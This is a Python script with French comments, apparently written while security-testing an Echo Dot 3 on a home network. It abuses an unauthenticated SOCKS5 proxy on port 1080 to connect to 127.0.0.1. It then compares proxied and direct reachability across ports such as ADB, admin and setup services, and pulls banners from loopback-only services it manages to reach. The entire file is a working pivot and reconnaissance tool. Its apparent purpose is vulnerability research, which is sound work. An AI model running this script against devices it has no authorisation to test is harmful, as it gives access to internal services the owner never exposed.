#!/usr/bin/env python3
"""
socks_pivot.py — le seul test qui reste sur l'Echo Dot 3.

Principe : le port 1080 est un SOCKS5 SANS authentification (prouvé).
Si ce proxy accepte CONNECT vers 127.0.0.1, il devient un PASSE-PARTOT vers les
services qui se croient "locaux" (donc de confiance) sur le device.

Test différentiel = la preuve :
  - port FERMÉ en direct depuis le LAN, mais OUVERT via le proxy sur 127.0.0.1
    => service lié à loopback, atteint sans y être autorisé  => vraie trouvaille.

Usage : python3 socks_pivot.py 192.168.50.25
"""
import socket, struct, sys

IP = sys.argv[1] if len(sys.argv) > 1 else "192.168.50.25"
SOCKS = 1080

# ports internes plausibles + ceux qu'on a déjà vus sur ce device
TARGETS = [
    5541,  # NOUVEAU, jamais cartographié (apparu en mode enregistré)
    8080, 8081,          # serveur de setup / admin
    4070,                # service Go (Coral ?)
    6543, 8888,          # avs-ffreg / inconnu
    80, 443, 22,         # web / ssh
    5037, 5555,          # adb (si debug actif)
    8008, 8009, 9000,    # cast/google-ish
    5000, 3000, 7000,    # APIs internes
    2222, 1234,
]

def direct(port, timeout=1.2):
    s = socket.socket(); s.settimeout(timeout)
    ok = s.connect_ex((IP, port)) == 0
    s.close(); return ok

def via_socks(port, timeout=5.0):
    """Retourne (ok, message). ok=True seulement si le proxy établit la connexion."""
    try:
        s = socket.create_connection((IP, SOCKS), timeout=timeout)
    except Exception as e:
        return False, f"proxy injoignable ({e})"
    try:
        s.settimeout(timeout)
        s.sendall(b"\x05\x01\x00")
        r = s.recv(2)
        if r != b"\x05\x00":
            return False, f"auth refusée {r!r}"
        s.sendall(b"\x05\x01\x00\x01" + b"\x7f\x00\x00\x01" + struct.pack(">H", port))
        rep = s.recv(4)
        if len(rep) < 2:
            return False, "réponse tronquée"
        code = rep[1]
        msgs = {0: "CONNECT OK", 1: "refus général", 2: "interdit par règle",
                3: "réseau injoignable", 4: "hôte injoignable", 5: "refusé par l'hôte",
                6: "TTL expiré", 7: "commande non supportée", 8: "type d'adresse non supporté"}
        return code == 0, msgs.get(code, f"code={code}")
    except Exception as e:
        return False, f"err {e}"
    finally:
        try: s.close()
        except Exception: pass

def banner_via_socks(port, payload=b"GET / HTTP/1.0\r\n\r\n"):
    """Si CONNECT passe, lit ce que le service veut bien dire."""
    try:
        s = socket.create_connection((IP, SOCKS), timeout=5)
        s.settimeout(3)
        s.sendall(b"\x05\x01\x00"); s.recv(2)
        s.sendall(b"\x05\x01\x00\x01" + b"\x7f\x00\x00\x01" + struct.pack(">H", port))
        if len(s.recv(4)) < 2: return b""
        s.sendall(payload)
        return s.recv(400)
    except Exception:
        return b""
    finally:
        try: s.close()
        except Exception: pass

def main():
    print(f"cible {IP} — proxy SOCKS5 :{SOCKS}\n")
    print(f"{'port':>6}  {'direct LAN':>11}  {'via proxy 127.0.0.1':>20}  verdict")
    print("-" * 68)
    trouvailles = []
    for p in TARGETS:
        d = direct(p)
        ok, msg = via_socks(p)
        if ok and not d:
            verdict = "*** PIVOT : loopback-only atteint ***"
            trouvailles.append(p)
        elif ok and d:
            verdict = "déjà exposé (moins intéressant)"
        elif d and not ok:
            verdict = "exposé en direct, refusé par le proxy"
        else:
            verdict = "-"
        print(f"{p:>6}  {'OUVERT' if d else 'fermé':>11}  {msg:>20}  {verdict}")
    if trouvailles:
        print("\n=== bannières des services atteints ===")
        for p in trouvailles:
            b = banner_via_socks(p)
            print(f"  {p}: {b[:200]!r}")
    else:
        print("\nAucun pivot loopback : le SOCKS est confiné. Surface refermée.")

if __name__ == "__main__":
    main()
